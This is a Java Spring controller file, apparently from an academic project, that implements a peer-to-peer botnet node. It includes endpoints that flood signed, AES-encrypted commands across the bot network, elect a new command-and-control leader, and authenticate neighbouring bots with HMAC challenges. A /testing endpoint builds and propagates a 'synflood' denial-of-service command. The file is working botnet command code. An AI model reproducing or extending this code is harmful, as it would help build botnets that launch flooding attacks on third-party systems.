package cs.sii.controller;

import java.security.InvalidKeyException;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.SignatureException;
import java.util.ArrayList;
import java.util.Random;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import cs.sii.bot.action.Auth;
import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;

//Controller del Bot che gestisce le richieste della rete P2P dei Bot 

@Component
@RestController
@RequestMapping("/bot")
public class BotController {

	@Autowired
	Config engineBot;

	@Autowired
	Auth auth;

	@Autowired
	CryptoPKI pki;

	@Autowired
	Behavior bhv;

	@Autowired
	NetworkService nServ;

	@RequestMapping("/")
	public String index() {
		return "BOT OPERATIVO";
	}

	@RequestMapping(value = "/flood", method = RequestMethod.POST)
	public Boolean msgFlood(@RequestBody String msg, HttpServletRequest req) {


		 System.out.println("non lo mando a addr: " + req.getRemoteAddr());
		 System.out.println("host: " + req.getRemoteHost());

		
		IP ip = new IP(req.getRemoteAddr());
		System.out.println("Richiesta di Flood ricevuta da " + ip.toString());
		bhv.floodAndExecute(msg, ip);
		return true;
	}

	@RequestMapping("/newKing")
	public Boolean newKing(HttpServletRequest req) {
		System.out.println("Richiesta di Elezione ricevuta da" + req.getRemoteAddr());
		if (bhv.getpServ().getNewKing().equals("") && nServ.isElegible() && (!(engineBot.isCommandandconquerStatus()))) {

			 System.out.println("addr: " + req.getRemoteAddr());
			 System.out.println("host: " + req.getRemoteHost());

			bhv.getPower(req.getRemoteAddr());
			return true;
		} else {
			// System.out.println("not elegible or already elected");
			System.out.println("Non elegibile o gia eletto");
			return false;
		}
	}

	@RequestMapping(value = "/myneighbours/welcome", method = RequestMethod.POST)
	public Pairs<Long, Integer> myNeighbours(@RequestBody String idBot, HttpServletRequest req) {
		System.out.println("Richiesta challenge dal mio vicino ricevuta da" + req.getRemoteAddr());
		Pairs<Long, Integer> response = new Pairs<>();
		response = bhv.authReqBot(idBot);
		return response;
	}

	@RequestMapping(value = "/myneighbours/hmac", method = RequestMethod.POST)
	public Boolean myNeighboursHmac(@RequestBody ArrayList<Object> objects, HttpServletRequest req) {
		System.out.println("Richiesta con hmac de ricevuta da" + req.getRemoteAddr());
		Boolean response = false;
		response = bhv.checkHmacBot(objects);
		if (response) {
			IP ipbot = new IP(req.getRemoteAddr());
			PublicKey pubKey = pki.rebuildPuK(objects.get(2).toString());
			Pairs<IP, PublicKey> bot = new Pairs<IP, PublicKey>(ipbot, pubKey);
			nServ.getNeighbours().add(bot);
		}
		System.out.println("risposta" + response);
		return response;
	}

	
	
	
	@RequestMapping(value = "/ping", method = RequestMethod.POST)
	public Boolean ping(HttpServletRequest req) {
		//Valutare se eliminare auto-ping
		return true;
	}

	
	
	
	
	@RequestMapping("/testing")
	public Boolean testing() {

		// per efficienza chiamo un metodo asincrono e rispondo che ho ricevuto
		// il msg
		// tutto il resto avviene nella in Flood&Execute

		String cmd = "synflood";
		String msg = "";
		// aggiungi nonce time.millis
		Long milli = System.currentTimeMillis();

		Random rand = new SecureRandom(milli.toString().getBytes());
		Integer nounce = rand.nextInt();

		String hashIdMsg = pki.getCrypto().generateSha256(nounce.toString());

		String signature;
		try {
			signature = pki.signMessageRSA(hashIdMsg);
			System.out.println("signature originale " + signature);
			msg = hashIdMsg + "<HH>" + cmd + "<HH>" + signature;
			System.out.println("msg originale " + msg);
			msg = pki.getCrypto().encryptAES(msg);
			System.out.println("raw originale " + msg);
		} catch (InvalidKeyException | SignatureException e) {
			e.printStackTrace();
			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
		}

		bhv.floodAndExecute(msg, nServ.getMyIp());
		return true;
	}

}
